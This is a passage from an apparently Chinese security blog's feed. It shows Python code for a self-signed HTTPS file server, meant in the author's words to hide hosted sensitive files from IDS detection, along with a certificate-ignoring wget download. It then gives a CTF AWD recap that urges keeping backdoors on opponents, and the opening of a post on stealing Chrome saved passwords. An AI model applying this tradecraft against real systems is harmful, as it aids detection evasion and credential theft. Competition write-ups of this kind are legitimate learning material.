    &lt;span class=&quot;n&quot;&gt;cert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;get_subject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;OU&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Dummy Company Ltd&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;cert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;get_subject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CN&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;gethostname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;cert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;set_serial_number&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;cert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;gmtime_adj_notBefore&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;cert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;gmtime_adj_notAfter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;365&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;60&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;60&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;cert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;set_issuer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;get_subject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;cert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;set_pubkey&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;cert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;sign&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;sha1&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;if &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;exists&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cert_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)):&lt;/span&gt;
        &lt;span class=&quot;nf&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cert_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;wb&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;crypto&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;dump_certificate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;crypto&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FILETYPE_PEM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;if &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;exists&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)):&lt;/span&gt;
        &lt;span class=&quot;nf&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;wb&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;crypto&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;dump_privatekey&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;crypto&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FILETYPE_PEM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;if &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;exists&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pem_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)):&lt;/span&gt;
        &lt;span class=&quot;nf&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pem_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;wb&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;crypto&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;dump_privatekey&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;crypto&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FILETYPE_PEM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
        &lt;span class=&quot;nf&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pem_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;ab&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;crypto&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;dump_certificate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;crypto&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FILETYPE_PEM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
    
&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;create_https_server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cert_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;server_address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;0.0.0.0&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;httpd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;http&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;HTTPServer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;server_address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;http&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SimpleHTTPRequestHandler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;httpd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ssl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;wrap_socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;httpd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;server_side&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;certfile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;server.pem&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ssl_version&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ssl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PROTOCOL_TLS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;except&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;nf&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[ERR] Port %d has been taken.&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Serving HTTPS on 0.0.0.0 port %d...&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;httpd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;serve_forever&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;__main__&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;create_self_signed_cert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CERT_PATH&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KEY_PATH&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PEM_PATH&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;create_https_server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CERT_PATH&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KEY_PATH&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;用上面的代码起个https服务，同样访问文件，因为是自签名的，所以用浏览器访问依然会被浏览器标记为不信任，还是显示为http&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/image-20230613145420949.png&quot; alt=&quot;image-20230613145420949&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/image-20230613141549693.png&quot; alt=&quot;image-20230613141549693&quot; style=&quot;zoom: 80%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;但是用wireshark抓包看，流量都已被加密了&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/image-20230613141909325.png&quot; alt=&quot;image-20230613141909325&quot; style=&quot;zoom: 67%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;有的时候我们会放些敏感文件托管在服务器上，直接起个http的在服务器上，很容易几天就被标成恶意ip了。可能就是因为明文传输过程中敏感文件中的特征引起的，这种起个自签名的https服务，流量是被加密过的，对IDS在流量层面的检测应该也有点作用&lt;/p&gt;

&lt;h1 id=&quot;download-file&quot;&gt;Download file&lt;/h1&gt;

&lt;p&gt;由于是自签名的，下载文件时需要忽略证书检查，否则下载不成功&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/image-20230613134029212.png&quot; alt=&quot;image-20230613134029212&quot; /&gt;&lt;/p&gt;

&lt;p&gt;比如wget&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wget --no-check-certificate https://192.168.110.1:9999/demo.py
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/img/image-20230613144331303.png&quot; alt=&quot;image-20230613144331303&quot; /&gt;&lt;/p&gt;
</description>
        <pubDate>Mon, 12 Jun 2023 00:00:00 +0800</pubDate>
        <link>http://localhost:4000/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7/2023/06/12/%E7%94%A8python%E8%B5%B7%E4%B8%80%E4%B8%AAhttps%E6%9C%8D%E5%8A%A1%E5%99%A8.html</link>
        <guid isPermaLink="true">http://localhost:4000/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7/2023/06/12/%E7%94%A8python%E8%B5%B7%E4%B8%80%E4%B8%AAhttps%E6%9C%8D%E5%8A%A1%E5%99%A8.html</guid>
        
        
        <category>渗透技巧</category>
        
      </item>
    
      <item>
        <title>CTF——上海东华大学-AWD磐石行动之旅</title>
        <description>&lt;h1 id=&quot;about-competition&quot;&gt;About competition&lt;/h1&gt;

&lt;p&gt;第二次打AWD了，但其实和第一次没什么差别，不仅是队友换了。为什么呢，这个我想了下，后面有机会再说吧&lt;/p&gt;

&lt;p&gt;环境给了四台靶机，两台pwn，两台web，web一台php的，一台java的&lt;/p&gt;

&lt;p&gt;前期靠着手快，打了个第二，md忘了截图了，哈哈&lt;/p&gt;

&lt;p&gt;中后期就撑不住了。我们三个web，pwn靶机没人修，也不会修，：——）&lt;/p&gt;

&lt;p&gt;靠着审代码和抓流量，拿到几个洞，也都上了批量脚本了，基本每轮都开始自动攻击了，但是得分比不上扣分，排名直线下降&lt;/p&gt;

&lt;p&gt;比完了想明白了&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/image-20230612123048146.png&quot; alt=&quot;image-20230612123048146&quot; /&gt;&lt;/p&gt;

&lt;p&gt;是所有攻破的团队共享这50分，所以要想上大分，不仅要自己拿到flag，还要让别人拿不到flag，：）。交大哥们真是一语惊醒梦中人&lt;/p&gt;

&lt;p&gt;所以权限维持做的好就很重要，后门做好了，要是人家还把站删了你就高兴坏了，分全是你的&lt;/p&gt;

&lt;p&gt;php是tp5的，java就是spingboot的，洞也不是很难，所以多熟悉下这种mvc框架对应的具体原理，比如路由，控制器原理什么的，不然你抓到对面的流量但是找不到对应文件的位置就尴尬了，那还怎么修呢&lt;/p&gt;

&lt;p&gt;个人感觉AWD还是很有意思的，但是这种比赛的体验度纯看主办方的实力和参赛选手的准备程度。主办方不行，平台卡的一批；参赛选手实力层次不齐，很容易出现强队打全场，其余纯坐牢的问题。&lt;/p&gt;

&lt;h1 id=&quot;something-inter&quot;&gt;Something inter&lt;/h1&gt;

&lt;p&gt;上海的物价还是高呀，同样的三四百一晚的酒店，住了个格子间。这是酒店里的不知名恐怖&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/24436a7f1a8dde315055fe45353ac1c.jpg&quot; alt=&quot;24436a7f1a8dde315055fe45353ac1c&quot; style=&quot;zoom: 33%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;外滩没去成，正赶上下雨了，就先撤了，群友的图。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/5e5c73c25a8827015158d64da4cd02f.jpg&quot; alt=&quot;5e5c73c25a8827015158d64da4cd02f&quot; style=&quot;zoom: 25%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/fdcb5b04aa25f466a883f51bfbf088b.jpg&quot; alt=&quot;fdcb5b04aa25f466a883f51bfbf088b&quot; style=&quot;zoom: 25%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/微信图片_20230612121555.jpg&quot; alt=&quot;微信图片_20230612121555&quot; style=&quot;zoom: 33%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;去的路上杨哥坐地铁还做反了，说实话我还不清楚这搁地上跑的还叫不叫地铁，或许叫城市轻轨，哈哈&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/522ba2b9bb470d97beac597dd8ce651.jpg&quot; alt=&quot;522ba2b9bb470d97beac597dd8ce651&quot; style=&quot;zoom:33%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;酒店边上的社区食堂伙食真不错，价格也舒服。学校食堂要是有着，天天早上跳起来吃早餐&lt;/p&gt;

&lt;p&gt;在这里吃饭的大爷大妈都很熟络，是个很舒服的社区啊。一个奶奶热心的教我们怎么吃汤包，太腼腆了没来得及说声蟹蟹，哈哈&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/7e126b1c97a261265f0d339448b75a6.jpg&quot; alt=&quot;7e126b1c97a261265f0d339448b75a6&quot; style=&quot;zoom:33%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;运气好，回来没赶上雷暴雨&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/556250af92bfe62699eaf9821d54683.jpg&quot; alt=&quot;556250af92bfe62699eaf9821d54683&quot; style=&quot;zoom: 33%;&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;about-ctf-life&quot;&gt;About CTF life&lt;/h1&gt;

&lt;p&gt;​	大二也快结束了，似乎安全狗的大学只有两年，大三就跑了（考研哥和保研哥不论）。ctf打了两年，大成就没有，但也脱离了一般选手的行列，各种赛事也能输出能闯进线下，但做不到顶尖，拿大奖还是很南。还是太菜了。&lt;/p&gt;

&lt;p&gt;ctf是越来越火热了，从学生到工作的安服哥，体制哥，甲方哥，都开始接触到ctf的“魅力”了吧，毕竟蓝桥杯都开始插手了。完成了从做题人到出题人身份的转变，发下很多水平一般的比赛也就是那么一回事。出题人和参赛选手都是同一批人，其他人怎么打，能怎么打，手动苦笑：》，佛系学习就行&lt;/p&gt;

&lt;p&gt;一个校队的崛起，或许就从混上了联队的步伐开始。强的哥们有，但没那么多。xctf决赛还有找过来买题的，也不知道该怎么说。所以你几个人怎么打的过一群人，你三个人就是三个人，人家三个后面有一堆。俗世旧病，难作言论。大二上也想过去联队，为了不跟校队的冲突（比赛全报销的机制还是很香的），投了个国际纵队的想多打国际赛学习学习，简历直接就挂了，哈哈：）。后来想想就算了，也是觉得现在的ctf越来越没意思了，不如在校队苟延残喘我这ctf life，搞后渗透去喽。&lt;/p&gt;

&lt;h2 id=&quot;about-team&quot;&gt;About Team&lt;/h2&gt;

&lt;p&gt;之所以说第二次打AWD和第一次打没什么差别，因为上次比赛完了过后，和队友根本没有复盘的。不清楚是什么问题。&lt;/p&gt;

&lt;p&gt;我们这比赛打了就是打了，打完了各顾各的复盘，说不上交流，然后接着开下一把。平时大家的生活也是割离的，或许这样也是正常状态吧&lt;/p&gt;

&lt;p&gt;佩服联队的运营和管理，能凝聚起一群生活在各地的人，也是不易呀&lt;/p&gt;

</description>
        <pubDate>Sun, 11 Jun 2023 00:00:00 +0800</pubDate>
        <link>http://localhost:4000/ctf/awd%E7%BA%BF%E4%B8%8B/2023/06/11/%E4%B8%8A%E6%B5%B7%E4%B8%9C%E5%8D%8E%E5%A4%A7%E5%AD%A6-AWD%E7%A3%90%E7%9F%B3%E8%A1%8C%E5%8A%A8%E4%B9%8B%E6%97%85.html</link>
        <guid isPermaLink="true">http://localhost:4000/ctf/awd%E7%BA%BF%E4%B8%8B/2023/06/11/%E4%B8%8A%E6%B5%B7%E4%B8%9C%E5%8D%8E%E5%A4%A7%E5%AD%A6-AWD%E7%A3%90%E7%9F%B3%E8%A1%8C%E5%8A%A8%E4%B9%8B%E6%97%85.html</guid>
        
        
        <category>CTF</category>
        
        <category>AWD线下</category>
        
      </item>
    
      <item>
        <title>渗透取证技巧--Chrome浏览器密码凭据窃取和C#实现</title>
        <description>&lt;h1 id=&quot;文前漫谈&quot;&gt;文前漫谈&lt;/h1&gt;

&lt;p&gt;权限维持的重要步骤，抓密码。本文通过对Windows DPAPI的基本认识和chrome密码加密机制的理解基础上，编写C#代码实现对chrome浏览器密码的解密&lt;/p&gt;

&lt;p&gt;实际利用下，最好是通过go，c/c++这种改写或者编到cs的插件中，基于.net平台还是有点麻烦，得准备两三个版本。&lt;/p&gt;

&lt;h1 id=&quot;chrome的加密过程&quot;&gt;Chrome的加密过程&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;将用户保存的账户密码使用AES GCM加密&lt;/li&gt;
  &lt;li&gt;将AES加密密钥通过Windows DPAPI加密保存在名为Local State的文件中，文件以json格式存储。&lt;/li&gt;
  &lt;li&gt;将初始化向量与密文连接起来，并将它们保存在名为Login Data的文件中，文件以sqlite数据库形式存储。&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;local-state加密密钥存放的位置&quot;&gt;Local State——加密密钥存放的位置&lt;/h2&gt;

